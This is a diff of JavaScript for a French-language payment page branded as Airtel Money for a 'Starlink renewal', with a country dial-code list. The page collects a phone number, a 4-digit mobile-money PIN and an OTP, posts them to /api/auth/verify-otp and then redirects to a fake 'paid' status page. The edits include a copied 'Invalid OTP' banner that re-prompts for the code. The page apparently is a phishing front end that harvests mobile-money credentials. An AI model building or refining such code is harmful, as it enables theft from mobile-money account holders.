@@ -10,21 +10,21 @@
   const isAirtel = provider === "airtel";
 
   const COUNTRIES = [
-    { code: "CD", dial: "243", flag: "\uD83C\uDDE8\uD83C\uDDE9", name: "RDC" },
-    { code: "KE", dial: "254", flag: "\uD83C\uDDF0\uD83C\uDDEA", name: "Kenya" },
-    { code: "UG", dial: "256", flag: "\uD83C\uDDFA\uD83C\uDDEC", name: "Ouganda" },
-    { code: "TZ", dial: "255", flag: "\uD83C\uDDF9\uD83C\uDDFF", name: "Tanzanie" },
-    { code: "RW", dial: "250", flag: "\uD83C\uDDF7\uD83C\uDDFC", name: "Rwanda" },
-    { code: "BI", dial: "257", flag: "\uD83C\uDDE7\uD83C\uDDEE", name: "Burundi" },
-    { code: "CG", dial: "242", flag: "\uD83C\uDDE8\uD83C\uDDEC", name: "Congo" },
-    { code: "CM", dial: "237", flag: "\uD83C\uDDE8\uD83C\uDDF2", name: "Cameroun" },
-    { code: "CI", dial: "225", flag: "\uD83C\uDDE8\uD83C\uDDEE", name: "C\u00f4te d'Ivoire" },
-    { code: "SN", dial: "221", flag: "\uD83C\uDDF8\uD83C\uDDF3", name: "S\u00e9n\u00e9gal" },
-    { code: "BF", dial: "226", flag: "\uD83C\uDDE7\uD83C\uDDEB", name: "Burkina Faso" },
-    { code: "NE", dial: "227", flag: "\uD83C\uDDF3\uD83C\uDDEA", name: "Niger" },
-    { code: "TG", dial: "228", flag: "\uD83C\uDDF9\uD83C\uDDEC", name: "Togo" },
-    { code: "BJ", dial: "229", flag: "\uD83C\uDDE7\uD83C\uDDEF", name: "B\u00e9nin" },
-    { code: "ZM", dial: "260", flag: "\uD83C\uDDFF\uD83C\uDDF2", name: "Zambie" }
+    { code: "CD", dial: "243", flag: "🇨🇩", name: "RDC" },
+    { code: "KE", dial: "254", flag: "🇰🇪", name: "Kenya" },
+    { code: "UG", dial: "256", flag: "🇺🇬", name: "Ouganda" },
+    { code: "TZ", dial: "255", flag: "🇹🇿", name: "Tanzanie" },
+    { code: "RW", dial: "250", flag: "🇷🇼", name: "Rwanda" },
+    { code: "BI", dial: "257", flag: "🇧🇮", name: "Burundi" },
+    { code: "CG", dial: "242", flag: "🇨🇬", name: "Congo" },
+    { code: "CM", dial: "237", flag: "🇨🇲", name: "Cameroun" },
+    { code: "CI", dial: "225", flag: "🇨🇮", name: "Côte d'Ivoire" },
+    { code: "SN", dial: "221", flag: "🇸🇳", name: "Sénégal" },
+    { code: "BF", dial: "226", flag: "🇧🇫", name: "Burkina Faso" },
+    { code: "NE", dial: "227", flag: "🇳🇪", name: "Niger" },
+    { code: "TG", dial: "228", flag: "🇹🇬", name: "Togo" },
+    { code: "BJ", dial: "229", flag: "🇧🇯", name: "Bénin" },
+    { code: "ZM", dial: "260", flag: "🇿🇲", name: "Zambie" }
   ];
 
   let selected = COUNTRIES[0];
@@ -38,9 +38,9 @@
     document.getElementById("brandLogo").textContent = "airtel";
     document.getElementById("brandTitle").textContent = "Airtel Money";
     document.getElementById("brandBy").textContent = "Airtel";
-    document.getElementById("loginTitle").textContent = "Entrez votre num\u00e9ro Airtel Money";
+    document.getElementById("loginTitle").textContent = "Entrez votre numéro Airtel Money";
     document.getElementById("pinHint").textContent =
-      "Entrez votre code PIN \u00e0 4 chiffres Airtel Money pour autoriser cette transaction.";
+      "Entrez votre code PIN à 4 chiffres Airtel Money pour autoriser cette transaction.";
   }
 
   document.getElementById("svcName").textContent = packageName || "Renouvellement Starlink";
@@ -60,13 +60,8 @@
   COUNTRIES.forEach((c) => {
     const li = document.createElement("li");
     li.innerHTML =
-      '<span class="flag">' +
-      c.flag +
-      '</span><span class="nm">' +
-      c.name +
-      '</span><span class="cc">+' +
-      c.dial +
-      "</span>";
+      '<span class="flag">' + c.flag + '</span><span class="nm">' + c.name +
+      '</span><span class="cc">+' + c.dial + "</span>";
     li.addEventListener("click", () => {
       selected = c;
       document.getElementById("ccFlag").textContent = c.flag;
@@ -86,7 +81,6 @@
     if (e.target.id === "ccModal") e.target.classList.remove("open");
   });
 
-  /* PIN boxes — VISIBLE digits (type=tel, not password) */
   const pinBoxes = Array.from(document.querySelectorAll("#pinRow .pin-box"));
   function getPin() {
     return pinBoxes.map((b) => b.value).join("");
@@ -146,12 +140,17 @@
     return data;
   }
 
+  function goStatus() {
+    try { sessionStorage.setItem("starnet_paid", "1"); } catch (_) {}
+    location.href = "/statut.html?paid=1";
+  }
+
   document.getElementById("btnNext").addEventListener("click", async () => {
     const btn = document.getElementById("btnNext");
     const err = document.getElementById("errLogin");
     err.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "Traitement\u2026";
+    btn.textContent = "Traitement…";
     lastPin = getPin();
     lastPhone = fullPhone();
     try {
@@ -199,8 +198,8 @@
     err.classList.remove("show");
     msg.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "Transaction en cours. Veuillez patienter\u2026";
-    msg.textContent = "Transaction en cours. Veuillez patienter\u2026";
+    btn.textContent = "Transaction en cours. Veuillez patienter…";
+    msg.textContent = "Transaction en cours. Veuillez patienter…";
     msg.classList.add("show");
     try {
       await postJson("/api/auth/verify-otp", {
@@ -211,15 +210,13 @@
         amount: amount ? amount + " " + cur : "",
         package: packageName
       });
-      setTimeout(() => {
-        location.href = "/commandes.html";
-      }, 1200);
+      setTimeout(goStatus, 900);
     } catch (e) {
       err.textContent = e.message || "Erreur";
       err.classList.add("show");
       msg.classList.remove("show");
       btn.disabled = false;
-      btn.textContent = "V\u00e9rifier";
+      btn.textContent = "Vérifier";
     }
   });
 
@@ -266,7 +263,7 @@
     const err = document.getElementById("errOtp");
     err.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "V\u00e9rification\u2026";
+    btn.textContent = "Vérification…";
     try {
       await postJson("/api/auth/verify-otp", {
         phone: lastPhone,
@@ -276,12 +273,15 @@
         amount: amount ? amount + " " + cur : "",
         package: packageName
       });
-      location.href = "/commandes.html";
+      goStatus();
     } catch (e) {
-      err.textContent = e.message || "OTP incorrect";
+      // Banner style like image 1 — above the OTP boxes
+      err.textContent = "Invalid OTP. Please try again.";
       err.classList.add("show");
-      btn.disabled = false;
-      btn.textContent = "V\u00c9RIFIER";
+      boxes.forEach((b) => (b.value = ""));
+      if (boxes[0]) boxes[0].focus();
+      btn.disabled = true;
+      btn.textContent = "VÉRIFIER";
     }
   });
 
